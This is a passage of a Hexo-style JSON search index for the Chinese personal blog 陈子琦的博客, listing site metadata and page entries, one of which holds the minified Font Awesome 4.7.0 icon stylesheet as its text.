{"meta":{"title":"陈子琦的博客","subtitle":"行路有良友，便是捷径。","description":"行路有良友，便是捷径。","author":"陈子琦","url":"https://czqu.net","root":"/cn/"},"pages":[{"title":"categories","date":"2021-05-22T15:35:11.000Z","updated":"2021-05-22T15:35:11.000Z","comments":false,"path":"categories/index.html","permalink":"https://czqu.net/categories/index.html","excerpt":"","text":""},{"title":"标签","date":"2020-11-13T04:21:59.000Z","updated":"2020-11-13T04:21:59.000Z","comments":false,"path":"tags/index.html","permalink":"https://czqu.net/tags/index.html","excerpt":"","text":""},{"title":"","date":"2025-08-07T14:24:42.229Z","updated":"2025-08-07T14:24:42.229Z","comments":true,"path":"404/css/font-awesome.css","permalink":"https://czqu.net/404/css/font-awesome.css","excerpt":"","text":"/* build time:Thu Aug 07 2025 14:25:36 GMT+0000 (Coordinated Universal Time)*/ /*! * Font Awesome 4.7.0 by @davegandy - http://fontawesome.io - @fontawesome * License - http://fontawesome.io/license (Font: SIL OFL 1.1, CSS: MIT License) */@font-face{font-family:FontAwesome;src:url(../fonts/fontawesome-webfont.eot?v=4.7.0);src:url(../fonts/fontawesome-webfont.eot?#iefix&v=4.7.0) format('embedded-opentype'),url(../fonts/fontawesome-webfont.woff2?v=4.7.0) format('woff2'),url(../fonts/fontawesome-webfont.woff?v=4.7.0) format('woff'),url(../fonts/fontawesome-webfont.ttf?v=4.7.0) format('truetype'),url(../fonts/fontawesome-webfont.svg?v=4.7.0#fontawesomeregular) format('svg');font-weight:400;font-style:normal}.fa{display:inline-block;font:normal normal normal 14px/1 FontAwesome;font-size:inherit;text-rendering:auto;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.fa-lg{font-size:1.33333333em;line-height:.75em;vertical-align:-15%}.fa-2x{font-size:2em}.fa-3x{font-size:3em}.fa-4x{font-size:4em}.fa-5x{font-size:5em}.fa-fw{width:1.28571429em;text-align:center}.fa-ul{padding-left:0;margin-left:2.14285714em;list-style-type:none}.fa-ul>li{position:relative}.fa-li{position:absolute;left:-2.14285714em;width:2.14285714em;top:.14285714em;text-align:center}.fa-li.fa-lg{left:-1.85714286em}.fa-border{padding:.2em .25em .15em;border:solid .08em #eee;border-radius:.1em}.fa-pull-left{float:left}.fa-pull-right{float:right}.fa.fa-pull-left{margin-right:.3em}.fa.fa-pull-right{margin-left:.3em}.pull-right{float:right}.pull-left{float:left}.fa.pull-left{margin-right:.3em}.fa.pull-right{margin-left:.3em}.fa-spin{-webkit-animation:fa-spin 2s infinite linear;animation:fa-spin 2s infinite linear}.fa-pulse{-webkit-animation:fa-spin 1s infinite steps(8);animation:fa-spin 1s infinite steps(8)}@-webkit-keyframes fa-spin{0%{-webkit-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(359deg);transform:rotate(359deg)}}@keyframes fa-spin{0%{-webkit-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(359deg);transform:rotate(359deg)}}.fa-rotate-90{-webkit-transform:rotate(90deg);-ms-transform:rotate(90deg);transform:rotate(90deg)}.fa-rotate-180{-webkit-transform:rotate(180deg);-ms-transform:rotate(180deg);transform:rotate(180deg)}.fa-rotate-270{-webkit-transform:rotate(270deg);-ms-transform:rotate(270deg);transform:rotate(270deg)}.fa-flip-horizontal{-webkit-transform:scale(-1,1);-ms-transform:scale(-1,1);transform:scale(-1,1)}.fa-flip-vertical{-webkit-transform:scale(1,-1);-ms-transform:scale(1,-1);transform:scale(1,-1)}:root .fa-flip-horizontal,:root .fa-flip-vertical,:root .fa-rotate-180,:root .fa-rotate-270,:root .fa-rotate-90{filter:none}.fa-stack{position:relative;display:inline-block;width:2em;height:2em;line-height:2em;vertical-align:middle}.fa-stack-1x,.fa-stack-2x{position:absolute;left:0;width:100%;text-align:center}.fa-stack-1x{line-height:inherit}.fa-stack-2x{font-size:2em}.fa-inverse{color:#fff}.fa-glass:before{content:\"\\f000\"}.fa-music:before{content:\"\\f001\"}.fa-search:before{content:\"\\f002\"}.fa-envelope-o:before{content:\"\\f003\"}.fa-heart:before{content:\"\\f004\"}.fa-star:before{content:\"\\f005\"}.fa-star-o:before{content:\"\\f006\"}.fa-user:before{content:\"\\f007\"}.fa-film:before{content:\"\\f008\"}.fa-th-large:before{content:\"\\f009\"}.fa-th:before{content:\"\\f00a\"}.fa-th-list:before{content:\"\\f00b\"}.fa-check:before{content:\"\\f00c\"}.fa-close:before,.fa-remove:before,.fa-times:before{content:\"\\f00d\"}.fa-search-plus:before{content:\"\\f00e\"}.fa-search-minus:before{content:\"\\f010\"}.fa-power-off:before{content:\"\\f011\"}.fa-signal:before{content:\"\\f012\"}.fa-cog:before,.fa-gear:before{content:\"\\f013\"}.fa-trash-o:before{content:\"\\f014\"}.fa-home:before{content:\"\\f015\"}.fa-file-o:before{content:\"\\f016\"}.fa-clock-o:before{content:\"\\f017\"}.fa-road:before{content:\"\\f018\"}.fa-download:before{content:\"\\f019\"}.fa-arrow-circle-o-down:before{content:\"\\f01a\"}.fa-arrow-circle-o-up:before{content:\"\\f01b\"}.fa-inbox:before{content:\"\\f01c\"}.fa-play-circle-o:before{content:\"\\f01d\"}.fa-repeat:before,.fa-rotate-right:before{content:\"\\f01e\"}.fa-refresh:before{content:\"\\f021\"}.fa-list-alt:before{content:\"\\f022\"}.fa-lock:before{content:\"\\f023\"}.fa-flag:before{content:\"\\f024\"}.fa-headphones:before{content:\"\\f025\"}.fa-volume-off:before{content:\"\\f026\"}.fa-volume-down:before{content:\"\\f027\"}.fa-volume-up:before{content:\"\\f028\"}.fa-qrcode:before{content:\"\\f029\"}.fa-barcode:before{content:\"\\f02a\"}.fa-tag:before{content:\"\\f02b\"}.fa-tags:before{content:\"\\f02c\"}.fa-book:before{content:\"\\f02d\"}.fa-bookmark:before{content:\"\\f02e\"}.fa-print:before{content:\"\\f02f\"}.fa-camera:before{content:\"\\f030\"}.fa-font:before{content:\"\\f031\"}.fa-bold:before{content:\"\\f032\"}.fa-italic:before{content:\"\\f033\"}.fa-text-height:before{content:\"\\f034\"}.fa-text-width:before{content:\"\\f035\"}.fa-align-left:before{content:\"\\f036\"}.fa-align-center:before{content:\"\\f037\"}.fa-align-right:before{content:\"\\f038\"}.fa-align-justify:before{content:\"\\f039\"}.fa-list:before{content:\"\\f03a\"}.fa-dedent:before,.fa-outdent:before{content:\"\\f03b\"}.fa-indent:before{content:\"\\f03c\"}.fa-video-camera:before{content:\"\\f03d\"}.fa-image:before,.fa-photo:before,.fa-picture-o:before{content:\"\\f03e\"}.fa-pencil:before{content:\"\\f040\"}.fa-map-marker:before{content:\"\\f041\"}.fa-adjust:before{content:\"\\f042\"}.fa-tint:before{content:\"\\f043\"}.fa-edit:before,.fa-pencil-square-o:before{content:\"\\f044\"}.fa-share-square-o:before{content:\"\\f045\"}.fa-check-square-o:before{content:\"\\f046\"}.fa-arrows:before{content:\"\\f047\"}.fa-step-backward:before{content:\"\\f048\"}.fa-fast-backward:before{content:\"\\f049\"}.fa-backward:before{content:\"\\f04a\"}.fa-play:before{content:\"\\f04b\"}.fa-pause:before{content:\"\\f04c\"}.fa-stop:before{content:\"\\f04d\"}.fa-forward:before{content:\"\\f04e\"}.fa-fast-forward:before{content:\"\\f050\"}.fa-step-forward:before{content:\"\\f051\"}.fa-eject:before{content:\"\\f052\"}.fa-chevron-left:before{content:\"\\f053\"}.fa-chevron-right:before{content:\"\\f054\"}.fa-plus-circle:before{content:\"\\f055\"}.fa-minus-circle:before{content:\"\\f056\"}.fa-times-circle:before{content:\"\\f057\"}.fa-check-circle:before{content:\"\\f058\"}.fa-question-circle:before{content:\"\\f059\"}.fa-info-circle:before{content:\"\\f05a\"}.fa-crosshairs:before{content:\"\\f05b\"}.fa-times-circle-o:before{content:\"\\f05c\"}.fa-check-circle-o:before{content:\"\\f05d\"}.fa-ban:before{content:\"\\f05e\"}.fa-arrow-left:before{content:\"\\f060\"}.fa-arrow-right:before{content:\"\\f061\"}.fa-arrow-up:before{content:\"\\f062\"}.fa-arrow-down:before{content:\"\\f063\"}.fa-mail-forward:before,.fa-share:before{content:\"\\f064\"}.fa-expand:before{content:\"\\f065\"}.fa-compress:before{content:\"\\f066\"}.fa-plus:before{content:\"\\f067\"}.fa-minus:before{content:\"\\f068\"}.fa-asterisk:before{content:\"\\f069\"}.fa-exclamation-circle:before{content:\"\\f06a\"}.fa-gift:before{content:\"\\f06b\"}.fa-leaf:before{content:\"\\f06c\"}.fa-fire:before{content:\"\\f06d\"}.fa-eye:before{content:\"\\f06e\"}.fa-eye-slash:before{content:\"\\f070\"}.fa-exclamation-triangle:before,.fa-warning:before{content:\"\\f071\"}.fa-plane:before{content:\"\\f072\"}.fa-calendar:before{content:\"\\f073\"}.fa-random:before{content:\"\\f074\"}.fa-comment:before{content:\"\\f075\"}.fa-magnet:before{content:\"\\f076\"}.fa-chevron-up:before{content:\"\\f077\"}.fa-chevron-down:before{content:\"\\f078\"}.fa-retweet:before{content:\"\\f079\"}.fa-shopping-cart:before{content:\"\\f07a\"}.fa-folder:before{content:\"\\f07b\"}.fa-folder-open:before{content:\"\\f07c\"}.fa-arrows-v:before{content:\"\\f07d\"}.fa-arrows-h:before{content:\"\\f07e\"}.fa-bar-chart-o:before,.fa-bar-chart:before{content:\"\\f080\"}.fa-twitter-square:before{content:\"\\f081\"}.fa-facebook-square:before{content:\"\\f082\"}.fa-camera-retro:before{content:\"\\f083\"}.fa-key:before{content:\"\\f084\"}.fa-cogs:before,.fa-gears:before{content:\"\\f085\"}.fa-comments:before{content:\"\\f086\"}.fa-thumbs-o-up:before{content:\"\\f087\"}.fa-thumbs-o-down:before{content:\"\\f088\"}.fa-star-half:before{content:\"\\f089\"}.fa-heart-o:before{content:\"\\f08a\"}.fa-sign-out:before{content:\"\\f08b\"}.fa-linkedin-square:before{content:\"\\f08c\"}.fa-thumb-tack:before{content:\"\\f08d\"}.fa-external-link:before{content:\"\\f08e\"}.fa-sign-in:before{content:\"\\f090\"}.fa-trophy:before{content:\"\\f091\"}.fa-github-square:before{content:\"\\f092\"}.fa-upload:before{content:\"\\f093\"}.fa-lemon-o:before{content:\"\\f094\"}.fa-phone:before{content:\"\\f095\"}.fa-square-o:before{content:\"\\f096\"}.fa-bookmark-o:before{content:\"\\f097\"}.fa-phone-square:before{content:\"\\f098\"}.fa-twitter:before{content:\"\\f099\"}.fa-facebook-f:before,.fa-facebook:before{content:\"\\f09a\"}.fa-github:before{content:\"\\f09b\"}.fa-unlock:before{content:\"\\f09c\"}.fa-credit-card:before{content:\"\\f09d\"}.fa-feed:before,.fa-rss:before{content:\"\\f09e\"}.fa-hdd-o:before{content:\"\\f0a0\"}.fa-bullhorn:before{content:\"\\f0a1\"}.fa-bell:before{content:\"\\f0f3\"}.fa-certificate:before{content:\"\\f0a3\"}.fa-hand-o-right:before{content:\"\\f0a4\"}.fa-hand-o-left:before{content:\"\\f0a5\"}.fa-hand-o-up:before{content:\"\\f0a6\"}.fa-hand-o-down:before{content:\"\\f0a7\"}.fa-arrow-circle-left:before{content:\"\\f0a8\"}.fa-arrow-circle-right:before{content:\"\\f0a9\"}.fa-arrow-circle-up:before{content:\"\\f0aa\"}.fa-arrow-circle-down:before{content:\"\\f0ab\"}.fa-globe:before{content:\"\\f0ac\"}.fa-wrench:before{content:\"\\f0ad\"}.fa-tasks:before{content:\"\\f0ae\"}.fa-filter:before{content:\"\\f0b0\"}.fa-briefcase:before{content:\"\\f0b1\"}.fa-arrows-alt:before{content:\"\\f0b2\"}.fa-group:before,.fa-users:before{content:\"\\f0c0\"}.fa-chain:before,.fa-link:before{content:\"\\f0c1\"}.fa-cloud:before{content:\"\\f0c2\"}.fa-flask:before{content:\"\\f0c3\"}.fa-cut:before,.fa-scissors:before{content:\"\\f0c4\"}.fa-copy:before,.fa-files-o:before{content:\"\\f0c5\"}.fa-paperclip:before{content:\"\\f0c6\"}.fa-floppy-o:before,.fa-save:before{content:\"\\f0c7\"}.fa-square:before{content:\"\\f0c8\"}.fa-bars:before,.fa-navicon:before,.fa-reorder:before{content:\"\\f0c9\"}.fa-list-ul:before{content:\"\\f0ca\"}.fa-list-ol:before{content:\"\\f0cb\"}.fa-strikethrough:before{content:\"\\f0cc\"}.fa-underline:before{content:\"\\f0cd\"}.fa-table:before{content:\"\\f0ce\"}.fa-magic:before{content:\"\\f0d0\"}.fa-truck:before{content:\"\\f0d1\"}.fa-pinterest:before{content:\"\\f0d2\"}.fa-pinterest-square:before{content:\"\\f0d3\"}.fa-google-plus-square:before{content:\"\\f0d4\"}.fa-google-plus:before{content:\"\\f0d5\"}.fa-money:before{content:\"\\f0d6\"}.fa-caret-down:before{content:\"\\f0d7\"}.fa-caret-up:before{content:\"\\f0d8\"}.fa-caret-left:before{content:\"\\f0d9\"}.fa-caret-right:before{content:\"\\f0da\"}.fa-columns:before{content:\"\\f0db\"}.fa-sort:before,.fa-unsorted:before{content:\"\\f0dc\"}.fa-sort-desc:before,.fa-sort-down:before{content:\"\\f0dd\"}.fa-sort-asc:before,.fa-sort-up:before{content:\"\\f0de\"}.fa-envelope:before{content:\"\\f0e0\"}.fa-linkedin:before{content:\"\\f0e1\"}.fa-rotate-left:before,.fa-undo:before{content:\"\\f0e2\"}.fa-gavel:before,.fa-legal:before{content:\"\\f0e3\"}.fa-dashboard:before,.fa-tachometer:before{content:\"\\f0e4\"}.fa-comment-o:before{content:\"\\f0e5\"}.fa-comments-o:before{content:\"\\f0e6\"}.fa-bolt:before,.fa-flash:before{content:\"\\f0e7\"}.fa-sitemap:before{content:\"\\f0e8\"}.fa-umbrella:before{content:\"\\f0e9\"}.fa-clipboard:before,.fa-paste:before{content:\"\\f0ea\"}.fa-lightbulb-o:before{content:\"\\f0eb\"}.fa-exchange:before{content:\"\\f0ec\"}.fa-cloud-download:before{content:\"\\f0ed\"}.fa-cloud-upload:before{content:\"\\f0ee\"}.fa-user-md:before{content:\"\\f0f0\"}.fa-stethoscope:before{content:\"\\f0f1\"}.fa-suitcase:before{content:\"\\f0f2\"}.fa-bell-o:before{content:\"\\f0a2\"}.fa-coffee:before{content:\"\\f0f4\"}.fa-cutlery:before{content:\"\\f0f5\"}.fa-file-text-o:before{content:\"\\f0f6\"}.fa-building-o:before{content:\"\\f0f7\"}.fa-hospital-o:before{content:\"\\f0f8\"}.fa-ambulance:before{content:\"\\f0f9\"}.fa-medkit:before{content:\"\\f0fa\"}.fa-fighter-jet:before{content:\"\\f0fb\"}.fa-beer:before{content:\"\\f0fc\"}.fa-h-square:before{content:\"\\f0fd\"}.fa-plus-square:before{content:\"\\f0fe\"}.fa-angle-double-left:before{content:\"\\f100\"}.fa-angle-double-right:before{content:\"\\f101\"}.fa-angle-double-up:before{content:\"\\f102\"}.fa-angle-double-down:before{content:\"\\f103\"}.fa-angle-left:before{content:\"\\f104\"}.fa-angle-right:before{content:\"\\f105\"}.fa-angle-up:before{content:\"\\f106\"}.fa-angle-down:before{content:\"\\f107\"}.fa-desktop:before{content:\"\\f108\"}.fa-laptop:before{content:\"\\f109\"}.fa-tablet:before{content:\"\\f10a\"}.fa-mobile-phone:before,.fa-mobile:before{content:\"\\f10b\"}.fa-circle-o:before{content:\"\\f10c\"}.fa-quote-left:before{content:\"\\f10d\"}.fa-quote-right:before{content:\"\\f10e\"}.fa-spinner:before{content:\"\\f110\"}.fa-circle:before{content:\"\\f111\"}.fa-mail-reply:before,.fa-reply:before{content:\"\\f112\"}.fa-github-alt:before{content:\"\\f113\"}.fa-folder-o:before{content:\"\\f114\"}.fa-folder-open-o:before{content:\"\\f115\"}.fa-smile-o:before{content:\"\\f118\"}.fa-frown-o:before{content:\"\\f119\"}.fa-meh-o:before{content:\"\\f11a\"}.fa-gamepad:before{content:\"\\f11b\"}.fa-keyboard-o:before{content:\"\\f11c\"}.fa-flag-o:before{content:\"\\f11d\"}.fa-flag-checkered:before{content:\"\\f11e\"}.fa-terminal:before{content:\"\\f120\"}.fa-code:before{content:\"\\f121\"}.fa-mail-reply-all:before,.fa-reply-all:before{content:\"\\f122\"}.fa-star-half-empty:before,.fa-star-half-full:before,.fa-star-half-o:before{content:\"\\f123\"}.fa-location-arrow:before{content:\"\\f124\"}.fa-crop:before{content:\"\\f125\"}.fa-code-fork:before{content:\"\\f126\"}.fa-chain-broken:before,.fa-unlink:before{content:\"\\f127\"}.fa-question:before{content:\"\\f128\"}.fa-info:before{content:\"\\f129\"}.fa-exclamation:before{content:\"\\f12a\"}.fa-superscript:before{content:\"\\f12b\"}.fa-subscript:before{content:\"\\f12c\"}.fa-eraser:before{content:\"\\f12d\"}.fa-puzzle-piece:before{content:\"\\f12e\"}.fa-microphone:before{content:\"\\f130\"}.fa-microphone-slash:before{content:\"\\f131\"}.fa-shield:before{content:\"\\f132\"}.fa-calendar-o:before{content:\"\\f133\"}.fa-fire-extinguisher:before{content:\"\\f134\"}.fa-rocket:before{content:\"\\f135\"}.fa-maxcdn:before{content:\"\\f136\"}.fa-chevron-circle-left:before{content:\"\\f137\"}.fa-chevron-circle-right:before{content:\"\\f138\"}.fa-chevron-circle-up:before{content:\"\\f139\"}.fa-chevron-circle-down:before{content:\"\\f13a\"}.fa-html5:before{content:\"\\f13b\"}.fa-css3:before{content:\"\\f13c\"}.fa-anchor:before{content:\"\\f13d\"}.fa-unlock-alt:before{content:\"\\f13e\"}.fa-bullseye:before{content:\"\\f140\"}.fa-ellipsis-h:before{content:\"\\f141\"}.fa-ellipsis-v:before{content:\"\\f142\"}.fa-rss-square:before{content:\"\\f143\"}.fa-play-circle:before{content:\"\\f144\"}.fa-ticket:before{content:\"\\f145\"}.fa-minus-square:before{content:\"\\f146\"}.fa-minus-square-o:before{content:\"\\f147\"}.fa-level-up:before{content:\"\\f148\"}.fa-level-down:before{content:\"\\f149\"}.fa-check-square:before{content:\"\\f14a\"}.fa-pencil-square:before{content:\"\\f14b\"}.fa-external-link-square:before{content:\"\\f14c\"}.fa-share-square:before{content:\"\\f14d\"}.fa-compass:before{content:\"\\f14e\"}.fa-caret-square-o-down:before,.fa-toggle-down:before{content:\"\\f150\"}.fa-caret-square-o-up:before,.fa-toggle-up:before{content:\"\\f151\"}.fa-caret-square-o-right:before,.fa-toggle-right:before{content:\"\\f152\"}.fa-eur:before,.fa-euro:before{content:\"\\f153\"}.fa-gbp:before{content:\"\\f154\"}.fa-dollar:before,.fa-usd:before{content:\"\\f155\"}.fa-inr:before,.fa-rupee:before{content:\"\\f156\"}.fa-cny:before,.fa-jpy:before,.fa-rmb:before,.fa-yen:before{content:\"\\f157\"}.fa-rouble:before,.fa-rub:before,.fa-ruble:before{content:\"\\f158\"}.fa-krw:before,.fa-won:before{content:\"\\f159\"}.fa-bitcoin:before,.fa-btc:before{content:\"\\f15a\"}.fa-file:before{content:\"\\f15b\"}.fa-file-text:before{content:\"\\f15c\"}.fa-sort-alpha-asc:before{content:\"\\f15d\"}.fa-sort-alpha-desc:before{content:\"\\f15e\"}.fa-sort-amount-asc:before{content:\"\\f160\"}.fa-sort-amount-desc:before{content:\"\\f161\"}.fa-sort-numeric-asc:before{content:\"\\f162\"}.fa-sort-numeric-desc:before{content:\"\\f163\"}.fa-thumbs-up:before{content:\"\\f164\"}.fa-thumbs-down:before{content:\"\\f165\"}.fa-youtube-square:before{content:\"\\f166\"}.fa-youtube:before{content:\"\\f167\"}.fa-xing:before{content:\"\\f168\"}.fa-xing-square:before{content:\"\\f169\"}.fa-youtube-play:before{content:\"\\f16a\"}.fa-dropbox:before{content:\"\\f16b\"}.fa-stack-overflow:before{content:\"\\f16c\"}.fa-instagram:before{content:\"\\f16d\"}.fa-flickr:before{content:\"\\f16e\"}.fa-adn:before{content:\"\\f170\"}.fa-bitbucket:before{content:\"\\f171\"}.fa-bitbucket-square:before{content:\"\\f172\"}.fa-tumblr:before{content:\"\\f173\"}.fa-tumblr-square:before{content:\"\\f174\"}.fa-long-arrow-down:before{content:\"\\f175\"}.fa-long-arrow-up:before{content:\"\\f176\"}.fa-long-arrow-left:before{content:\"\\f177\"}.fa-long-arrow-right:before{content:\"\\f178\"}.fa-apple:before{content:\"\\f179\"}.fa-windows:before{content:\"\\f17a\"}.fa-android:before{content:\"\\f17b\"}.fa-linux:before{content:\"\\f17c\"}.fa-dribbble:before{content:\"\\f17d\"}.fa-skype:before{content:\"\\f17e\"}.fa-foursquare:before{content:\"\\f180\"}.fa-trello:before{content:\"\\f181\"}.fa-female:before{content:\"\\f182\"}.fa-male:before{content:\"\\f183\"}.fa-gittip:before,.fa-gratipay:before{content:\"\\f184\"}.fa-sun-o:before{content:\"\\f185\"}.fa-moon-o:before{content:\"\\f186\"}.fa-archive:before{content:\"\\f187\"}.fa-bug:before{content:\"\\f188\"}.fa-vk:before{content:\"\\f189\"}.fa-weibo:before{content:\"\\f18a\"}.fa-renren:before{content:\"\\f18b\"}.fa-pagelines:before{content:\"\\f18c\"}.fa-stack-exchange:before{content:\"\\f18d\"}.fa-arrow-circle-o-right:before{content:\"\\f18e\"}.fa-arrow-circle-o-left:before{content:\"\\f190\"}.fa-caret-square-o-left:before,.fa-toggle-left:before{content:\"\\f191\"}.fa-dot-circle-o:before{content:\"\\f192\"}.fa-wheelchair:before{content:\"\\f193\"}.fa-vimeo-square:before{content:\"\\f194\"}.fa-try:before,.fa-turkish-lira:before{content:\"\\f195\"}.fa-plus-square-o:before{content:\"\\f196\"}.fa-space-shuttle:before{content:\"\\f197\"}.fa-slack:before{content:\"\\f198\"}.fa-envelope-square:before{content:\"\\f199\"}.fa-wordpress:before{content:\"\\f19a\"}.fa-openid:before{content:\"\\f19b\"}.fa-bank:before,.fa-institution:before,.fa-university:before{content:\"\\f19c\"}.fa-graduation-cap:before,.fa-mortar-board:before{content:\"\\f19d\"}.fa-yahoo:before{content:\"\\f19e\"}.fa-google:before{content:\"\\f1a0\"}.fa-reddit:before{content:\"\\f1a1\"}.fa-reddit-square:before{content:\"\\f1a2\"}.fa-stumbleupon-circle:before{content:\"\\f1a3\"}.fa-stumbleupon:before{content:\"\\f1a4\"}.fa-delicious:before{content:\"\\f1a5\"}.fa-digg:before{content:\"\\f1a6\"}.fa-pied-piper-pp:before{content:\"\\f1a7\"}.fa-pied-piper-alt:before{content:\"\\f1a8\"}.fa-drupal:before{content:\"\\f1a9\"}.fa-joomla:before{content:\"\\f1aa\"}.fa-language:before{content:\"\\f1ab\"}.fa-fax:before{content:\"\\f1ac\"}.fa-building:before{content:\"\\f1ad\"}.fa-child:before{content:\"\\f1ae\"}.fa-paw:before{content:\"\\f1b0\"}.fa-spoon:before{content:\"\\f1b1\"}.fa-cube:before{content:\"\\f1b2\"}.fa-cubes:before{content:\"\\f1b3\"}.fa-behance:before{content:\"\\f1b4\"}.fa-behance-square:before{content:\"\\f1b5\"}.fa-steam:before{content:\"\\f1b6\"}.fa-steam-square:before{content:\"\\f1b7\"}.fa-recycle:before{content:\"\\f1b8\"}.fa-automobile:before,.fa-car:before{content:\"\\f1b9\"}.fa-cab:before,.fa-taxi:before{content:\"\\f1ba\"}.fa-tree:before{content:\"\\f1bb\"}.fa-spotify:before{content:\"\\f1bc\"}.fa-deviantart:before{content:\"\\f1bd\"}.fa-soundcloud:before{content:\"\\f1be\"}.fa-database:before{content:\"\\f1c0\"}.fa-file-pdf-o:before{content:\"\\f1c1\"}.fa-file-word-o:before{content:\"\\f1c2\"}.fa-file-excel-o:before{content:\"\\f1c3\"}.fa-file-powerpoint-o:before{content:\"\\f1c4\"}.fa-file-image-o:before,.fa-file-photo-o:before,.fa-file-picture-o:before{content:\"\\f1c5\"}.fa-file-archive-o:before,.fa-file-zip-o:before{content:\"\\f1c6\"}.fa-file-audio-o:before,.fa-file-sound-o:before{content:\"\\f1c7\"}.fa-file-movie-o:before,.fa-file-video-o:before{content:\"\\f1c8\"}.fa-file-code-o:before{content:\"\\f1c9\"}.fa-vine:before{content:\"\\f1ca\"}.fa-codepen:before{content:\"\\f1cb\"}.fa-jsfiddle:before{content:\"\\f1cc\"}.fa-life-bouy:before,.fa-life-buoy:before,.fa-life-ring:before,.fa-life-saver:before,.fa-support:before{content:\"\\f1cd\"}.fa-circle-o-notch:before{content:\"\\f1ce\"}.fa-ra:before,.fa-rebel:before,.fa-resistance:before{content:\"\\f1d0\"}.fa-empire:before,.fa-ge:before{content:\"\\f1d1\"}.fa-git-square:before{content:\"\\f1d2\"}.fa-git:before{content:\"\\f1d3\"}.fa-hacker-news:before,.fa-y-combinator-square:before,.fa-yc-square:before{content:\"\\f1d4\"}.fa-tencent-weibo:before{content:\"\\f1d5\"}.fa-qq:before{content:\"\\f1d6\"}.fa-wechat:before,.fa-weixin:before{content:\"\\f1d7\"}.fa-paper-plane:before,.fa-send:before{content:\"\\f1d8\"}.fa-paper-plane-o:before,.fa-send-o:before{content:\"\\f1d9\"}.fa-history:before{content:\"\\f1da\"}.fa-circle-thin:before{content:\"\\f1db\"}.fa-header:before{content:\"\\f1dc\"}.fa-paragraph:before{content:\"\\f1dd\"}.fa-sliders:before{content:\"\\f1de\"}.fa-share-alt:before{content:\"\\f1e0\"}.fa-share-alt-square:before{content:\"\\f1e1\"}.fa-bomb:before{content:\"\\f1e2\"}.fa-futbol-o:before,.fa-soccer-ball-o:before{content:\"\\f1e3\"}.fa-tty:before{content:\"\\f1e4\"}.fa-binoculars:before{content:\"\\f1e5\"}.fa-plug:before{content:\"\\f1e6\"}.fa-slideshare:before{content:\"\\f1e7\"}.fa-twitch:before{content:\"\\f1e8\"}.fa-yelp:before{content:\"\\f1e9\"}.fa-newspaper-o:before{content:\"\\f1ea\"}.fa-wifi:before{content:\"\\f1eb\"}.fa-calculator:before{content:\"\\f1ec\"}.fa-paypal:before{content:\"\\f1ed\"}.fa-google-wallet:before{content:\"\\f1ee\"}.fa-cc-visa:before{content:\"\\f1f0\"}.fa-cc-mastercard:before{content:\"\\f1f1\"}.fa-cc-discover:before{content:\"\\f1f2\"}.fa-cc-amex:before{content:\"\\f1f3\"}.fa-cc-paypal:before{content:\"\\f1f4\"}.fa-cc-stripe:before{content:\"\\f1f5\"}.fa-bell-slash:before{content:\"\\f1f6\"}.fa-bell-slash-o:before{content:\"\\f1f7\"}.fa-trash:before{content:\"\\f1f8\"}.fa-copyright:before{content:\"\\f1f9\"}.fa-at:before{content:\"\\f1fa\"}.fa-eyedropper:before{content:\"\\f1fb\"}.fa-paint-brush:before{content:\"\\f1fc\"}.fa-birthday-cake:before{content:\"\\f1fd\"}.fa-area-chart:before{content:\"\\f1fe\"}.fa-pie-chart:before{content:\"\\f200\"}.fa-line-chart:before{content:\"\\f201\"}.fa-lastfm:before{content:\"\\f202\"}.fa-lastfm-square:before{content:\"\\f203\"}.fa-toggle-off:before{content:\"\\f204\"}.fa-toggle-on:before{content:\"\\f205\"}.fa-bicycle:before{content:\"\\f206\"}.fa-bus:before{content:\"\\f207\"}.fa-ioxhost:before{content:\"\\f208\"}.fa-angellist:before{content:\"\\f209\"}.fa-cc:before{content:\"\\f20a\"}.fa-ils:before,.fa-shekel:before,.fa-sheqel:before{content:\"\\f20b\"}.fa-meanpath:before{content:\"\\f20c\"}.fa-buysellads:before{content:\"\\f20d\"}.fa-connectdevelop:before{content:\"\\f20e\"}.fa-dashcube:before{content:\"\\f210\"}.fa-forumbee:before{content:\"\\f211\"}.fa-leanpub:before{content:\"\\f212\"}.fa-sellsy:before{content:\"\\f213\"}.fa-shirtsinbulk:before{content:\"\\f214\"}.fa-simplybuilt:before{content:\"\\f215\"}.fa-skyatlas:before{content:\"\\f216\"}.fa-cart-plus:before{content:\"\\f217\"}.fa-cart-arrow-down:before{content:\"\\f218\"}.fa-diamond:before{content:\"\\f219\"}.fa-ship:before{content:\"\\f21a\"}.fa-user-secret:before{content:\"\\f21b\"}.fa-motorcycle:before{content:\"\\f21c\"}.fa-street-view:before{content:\"\\f21d\"}.fa-heartbeat:before{content:\"\\f21e\"}.fa-venus:before{content:\"\\f221\"}.fa-mars:before{content:\"\\f222\"}.fa-mercury:before{content:\"\\f223\"}.fa-intersex:before,.fa-transgender:before{content:\"\\f224\"}.fa-transgender-alt:before{content:\"\\f225\"}.fa-venus-double:before{content:\"\\f226\"}.fa-mars-double:before{content:\"\\f227\"}.fa-venus-mars:before{content:\"\\f228\"}.fa-mars-stroke:before{content:\"\\f229\"}.fa-mars-stroke-v:before{content:\"\\f22a\"}.fa-mars-stroke-h:before{content:\"\\f22b\"}.fa-neuter:before{content:\"\\f22c\"}.fa-genderless:before{content:\"\\f22d\"}.fa-facebook-official:before{content:\"\\f230\"}.fa-pinterest-p:before{content:\"\\f231\"}.fa-whatsapp:before{content:\"\\f232\"}.fa-server:before{content:\"\\f233\"}.fa-user-plus:before{content:\"\\f234\"}.fa-user-times:before{content:\"\\f235\"}.fa-bed:before,.fa-hotel:before{content:\"\\f236\"}.fa-viacoin:before{content:\"\\f237\"}.fa-train:before{content:\"\\f238\"}.fa-subway:before{content:\"\\f239\"}.fa-medium:before{content:\"\\f23a\"}.fa-y-combinator:before,.fa-yc:before{content:\"\\f23b\"}.fa-optin-monster:before{content:\"\\f23c\"}.fa-opencart:before{content:\"\\f23d\"}.fa-expeditedssl:before{content:\"\\f23e\"}.fa-battery-4:before,.fa-battery-full:before,.fa-battery:before{content:\"\\f240\"}.fa-battery-3:before,.fa-battery-three-quarters:before{content:\"\\f241\"}.fa-battery-2:before,.fa-battery-half:before{content:\"\\f242\"}.fa-battery-1:before,.fa-battery-quarter:before{content:\"\\f243\"}.fa-battery-0:before,.fa-battery-empty:before{content:\"\\f244\"}.fa-mouse-pointer:before{content:\"\\f245\"}.fa-i-cursor:before{content:\"\\f246\"}.fa-object-group:before{content:\"\\f247\"}.fa-object-ungroup:before{content:\"\\f248\"}.fa-sticky-